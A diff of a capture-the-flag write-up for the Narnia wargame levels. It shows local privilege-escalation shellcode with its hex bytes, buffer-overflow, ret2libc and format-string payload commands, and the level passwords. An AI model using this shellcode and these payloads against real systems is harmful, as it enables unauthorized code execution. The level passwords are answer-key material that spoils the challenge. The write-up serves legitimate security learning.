@@ -34,9 +34,6 @@ int main(){
 
 ##### PASS=efeidiedae 
 
-#
-#
-#
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
@@ -74,9 +71,7 @@ $ export EGG=$(python -c 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x5
 ##### PASS=nairiepecu
 
 
-#
-#
-#
+
 
 
 ------------------------------------------------------------------------------------------------------------------------------------
@@ -107,51 +102,44 @@ Here we have a classic BO (remember we have no ASLR and NX bit disabled). I appr
 narnia3 user id is 14003, so i could do a ret2libc composed by a call to setreuid and then a system bash. Alternatively is possible to perform a ropchain. 
 I decided to exploit this challenge by making my own shellcode.
 
-
-###### xor    %ebx,%ebx  `\x31\xdb`  
-###### lea    0x17(%ebx),%eax `\x8d\x43\x17`           
-###### int    $0x80 `\xcd\x80` 
-###### push   %ebx `\x53`                             
-###### push   $0x68732f6e `\x68\x6e\x2f\x73\x68`       
-###### push   $0x69622f2f `\x68\x2f\x2f\x62\x69`      
-###### mov %esp,%ebx `\x89\xe3`               
-###### push %eax `\x50`                             
-###### push %ebx `\x53`                             
-###### mov %esp,%ecx     `\x89\xe1`               
-###### cltd `\x99`                                    
-###### mov $0xb,%al`\xb0\x0b`                      
-###### int $0x80 `\xcd\x80` 
-#
-#
-#
-
+```assembly
+xor    %ebx,%ebx  # \x31\xdb  
+lea    0x17(%ebx),%eax # \x8d\x43\x17           
+int    $0x80 # \xcd\x80 
+push   %ebx # \x53                           
+push   $0x68732f6e # \x68\x6e\x2f\x73\x68       
+push   $0x69622f2f # \x68\x2f\x2f\x62\x69      
+mov %esp,%ebx # \x89\xe3               
+push %eax # \x50                              
+push %ebx # \x53                              
+mov %esp,%ecx # \x89\xe1                
+cltd # \x99                                     
+mov $0xb,%al # \xb0\x0b                       
+int $0x80 # \xcd\x80  
+```
 
 
 
 This shellcode makes a setreuid(0) syscall and then executes execve(/bin/bash), so I added the shellcode instruction that moves 0x36b3 (14003) in %ebx before making the syscall setreuid. 
 
 Here is the final shellcode. 
-
-###### xor %ebx,%ebx `\x31\xdb`
-###### mov $0x36b3,%ebx `\xbb\xb3\x36\x00\x00`
-###### lea 0x17(%ebx),%eax `\x8d\x43\x17` 
-###### int $0x80 `\xcd\x80`
-###### push %ebx `\x53` 
-###### push $0x68732f6e `\x68\x6e\x2f\x73\x68`
-###### push $0x69622f2f `\x68\x2f\x2f\x62\x69`
-###### mov %esp,%ebx `\x89\xe3`
-###### push %eax `\x50`                            
-###### push %ebx `\x53`
-###### mov %esp,%ecx `\x89\xe1`                    
-###### cltd `\x99`               
-###### mov    $0xb,%al `\xb0\x0b`
-###### int    $0x80 `\xcd\x80` 
-#
-#
+```assembly
+xor %ebx,%ebx # \x31\xdb
+mov $0x36b3,%ebx # \xbb\xb3\x36\x00\x00
+lea 0x17(%ebx),%eax # \x8d\x43\x17
+int $0x80 # \xcd\x80
+push %ebx # \x53 
+push $0x68732f6e # \x68\x6e\x2f\x73\x68
+push $0x69622f2f # \x68\x2f\x2f\x62\x69
+mov %esp,%ebx # \x89\xe3
+push %eax # \x50                            
+push %ebx # \x53
+mov %esp,%ecx # \x89\xe1                    
+cltd #\x99               
+mov $0xb,%al # \xb0\x0b
+int $0x80 # \xcd\x80
+```
 ##### PASS=vaequeezee
-#
-#
-#
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
@@ -214,9 +202,6 @@ Now we make `/tmp/exploit` folder in which we create the symbolic link to the fl
 
 ##### PASS=thaenohtai
 
-#
-#
-#
 
 
 
@@ -293,9 +278,6 @@ $ ./narnia4 $(python -c 'print "\x90"*217+"\x31\xdb\x31\xc9\x31\xc0\x31\xff\x66\
 
 ##### PASS=faimahchiy
 
-#
-#
-#
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
@@ -340,9 +322,7 @@ Notice that we can write format string in argv[1] and with sprints we are able t
 
 ##### pass=neezocaeng
 
-#
-#
-#
+
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
@@ -413,9 +393,7 @@ $ ./narnia6 $(python -c 'print "a"*4+" "+"/bin/sh;"*2+"\x40\x19\xe5\xf7"')
 
 
 ##### PASS=ahkiaziphu
-#
-#
-#
+
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
@@ -487,9 +465,7 @@ $ ./narnia7 $(python -c 'print "\x7c\xd4\xff\xff"*18+"\x7d\xd4\xff\xff"+"\x7e\xd
 ```
 
 ##### PASS=mohthuphog
-#
-#
-#
+
 
 
 ------------------------------------------------------------------------------------------------------------------------------------
